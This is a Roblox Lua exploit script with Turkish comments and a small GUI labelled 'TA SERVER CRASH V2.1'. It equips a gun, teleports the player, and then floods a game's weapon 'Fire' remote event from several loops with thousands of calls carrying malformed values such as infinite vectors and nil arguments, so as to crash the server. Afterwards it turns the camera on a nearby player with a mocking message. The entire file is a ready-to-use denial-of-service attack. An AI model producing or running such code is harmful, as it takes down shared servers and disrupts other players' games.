local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local UIS = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local FireRemote = ReplicatedStorage:WaitForChild("SilahTA"):WaitForChild("SilahRemotes"):WaitForChild("Fire")
local Camera = workspace.CurrentCamera

-- Otomatik Glock'u eline al
spawn(function()
    pcall(function()
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("glock") then
                tool.Parent = LocalPlayer.Character
                break
            end
        end
    end)
end)

-- Spawnpoint bulucu (ekrandaki en yakın)
local function getClosestSpawn()
    local closest, minDist = nil, math.huge
    for _,v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name:lower():find("spawn") then
            local pos, onScreen = Camera:WorldToViewportPoint(v.Position)
            if onScreen then
                local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                if dist < minDist then
                    closest = v
                    minDist = dist
                end
            end
        end
    end
    return closest
end

-- En yakın başka oyuncu bulucu
local function getClosestPlayer()
    local myPos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new()
    local closest, minDist = nil, math.huge
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist < minDist then
                closest = plr
                minDist = dist
            end
        end
    end
    return closest
end

-- KÜÇÜK SADE GUI
local gui = Instance.new("ScreenGui")
gui.Name = "TAServerCrashMiniGUI"
gui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.11, 0)
frame.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
frame.BorderSizePixel = 0
frame.Parent = gui
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 24)
title.Position = UDim2.new(0, 0, 0, 2)
title.BackgroundTransparency = 1
title.Font = Enum.Font.FredokaOne
title.Text = "TA SERVER CRASH V2.1"
title.TextColor3 = Color3.fromRGB(255,50,80)
title.TextSize = 18

local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0, 16)
credit.Position = UDim2.new(0, 0, 0, 24)
credit.BackgroundTransparency = 1
credit.Text = "Made By V0C0N1337"
credit.Font = Enum.Font.GothamSemibold
credit.TextColor3 = Color3.fromRGB(100,255,180)
credit.TextSize = 13

local crashBtn = Instance.new("TextButton", frame)
crashBtn.Size = UDim2.new(1,-24,0,38)
crashBtn.Position = UDim2.new(0,12,0,56)
crashBtn.BackgroundColor3 = Color3.fromRGB(255,50,80)
crashBtn.Text = "CRASH"
crashBtn.Font = Enum.Font.GothamBlack
crashBtn.TextColor3 = Color3.fromRGB(255,255,255)
crashBtn.TextSize = 20
crashBtn.AutoButtonColor = true
local btncorner = Instance.new("UICorner", crashBtn)
btncorner.CornerRadius = UDim.new(0, 8)

-- Drag için
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Bildirim fonksiyonu
local function showNotification(text, time)
    local notif = Instance.new("TextLabel")
    notif.Parent = gui
    notif.Size = UDim2.new(0, 250, 0, 36)
    notif.Position = UDim2.new(0.5, -125, 0.18, 0)
    notif.BackgroundColor3 = Color3.fromRGB(34,40,50)
    notif.Font = Enum.Font.GothamBlack
    notif.Text = text
    notif.TextColor3 = Color3.fromRGB(255, 255, 255)
    notif.TextSize = 18
    notif.BackgroundTransparency = 0.15
    notif.ZIndex = 10
    local nc = Instance.new("UICorner", notif)
    nc.CornerRadius = UDim.new(0,10)
    notif.Visible = true
    spawn(function()
        wait(time or 2)
        notif:Destroy()
    end)
end

-- Evet/No paneli
local function askViewCrashland(callback)
    local ask = Instance.new("Frame")
    ask.Parent = gui
    ask.Size = UDim2.new(0, 250, 0, 70)
    ask.Position = UDim2.new(0.5, -125, 0.18, 40)
    ask.BackgroundColor3 = Color3.fromRGB(52,28,60)
    ask.BackgroundTransparency = 0.13
    ask.ZIndex = 12
    local ac = Instance.new("UICorner", ask)
    ac.CornerRadius = UDim.new(0,12)
    local txt = Instance.new("TextLabel", ask)
    txt.Size = UDim2.new(1,0,0,36)
    txt.Position = UDim2.new(0,0,0,4)
    txt.BackgroundTransparency = 1
    txt.Font = Enum.Font.GothamBlack
    txt.Text = "Oyunun crashlandığını görmek ister misin?"
    txt.TextColor3 = Color3.fromRGB(255,255,255)
    txt.TextSize = 14
    txt.ZIndex = 13
    local evet = Instance.new("TextButton", ask)
    evet.Size = UDim2.new(0.5,-8,0,24)
    evet.Position = UDim2.new(0,6,0,44)
    evet.BackgroundColor3 = Color3.fromRGB(0,200,100)
    evet.Text = "EVET"
    evet.Font = Enum.Font.GothamBold
    evet.TextColor3 = Color3.fromRGB(255,255,255)
    evet.TextSize = 15
    evet.ZIndex = 13
    local ec = Instance.new("UICorner", evet)
    ec.CornerRadius = UDim.new(0,8)
    evet.MouseButton1Click:Connect(function()
        ask:Destroy()
        callback(true)
    end)
    -- İsterse "hayır" butonunu koyabilirsin, ama tek "evet" dedin.
end

-- Orijinal crash spam kodun:
local minX,maxX = -6000,6000; local minY,maxY = 0,600; local minZ,maxZ = -6000,6000
local _crashing = false
function CrashRoutine()
    _crashing = true
    spawn(function()
        while _crashing do
            local spawnpart = getClosestSpawn()
            local spawnpos = spawnpart and spawnpart.Position or Vector3.new(0,100,0)
            -- Otomatik spawnpoint'e CFrame (TP)
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(spawnpos + Vector3.new(0,3,0))
            end
            for x = minX, maxX, 500 do
                for y = minY, maxY, 100 do
                    for z = minZ, maxZ, 500 do
                        local args = {
                            spawnpos,
                            Vector3.new(x+math.random(-20,20),y+math.random(-10,10),z+math.random(-20,20)),
                            nil,
                            "Single"
                        }
                        FireRemote:FireServer(unpack(args))
                    end
                end
            end
            for i=1,400 do
                local randPos = Vector3.new(math.random(minX,maxX),math.random(minY,maxY),math.random(minZ,maxZ))
                FireRemote:FireServer(spawnpos, randPos, nil, "Spam")
            end
            wait(0.09)
        end
    end)
    spawn(function()
        while _crashing do
            for i=1,1337 do
                local args = {
                    nil,
                    Vector3.new(math.random(-999999,999999), math.random(-999999,999999), math.random(-999999,999999)),
                    {math.random(), "vocoallahgibiadamfr", {false,true}},
                    math.huge,
                    "FULLMAP_"..tostring(math.random(1,99999)),
                    false,
                    Vector3.new(math.huge,math.huge,math.huge)
                }
                FireRemote:FireServer(unpack(args))
            end
            wait(0.13)
        end
    end)
    spawn(function()
        while _crashing do
            for _,player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    for i=1,66 do
                        local pos = Vector3.new(math.random(minX,maxX),math.random(minY,maxY),math.random(minZ,maxZ))
                        FireRemote:FireServer(spawnpos, pos, nil, "Ultra")
                    end
                end
            end
            wait(0.11)
        end
    end)
    spawn(function()
        while _crashing do
            for i=1,60 do
                FireRemote:FireServer(nil,nil,nil,nil,nil)
            end
            wait(0.05)
        end
    end)
end

crashBtn.MouseButton1Click:Connect(function()
    if not _crashing then
        crashBtn.Text = "DURDUR"
        crashBtn.BackgroundColor3 = Color3.fromRGB(30,255,80)
        showNotification("Server crash yiyor kardeşim benim!",2)
        CrashRoutine()
        -- 3 saniye sonra soru gelsin
        spawn(function()
            wait(3)
            askViewCrashland(function(evettiklandi)
                if evettiklandi then
                    local target = getClosestPlayer()
                    if target and target.Character and target.Character:FindFirstChild("Head") then
                        Camera.CameraSubject = target.Character.Head
                        showNotification(target.Name.."adama yazik olacak xd",2)
                    else
                        showNotification("Yakında adam yok!",2)
                    end
                end
            end)
        end)
    else
        _crashing = false
        crashBtn.Text = "CRASH"
        crashBtn.BackgroundColor3 = Color3.fromRGB(255,50,80)
    end
end)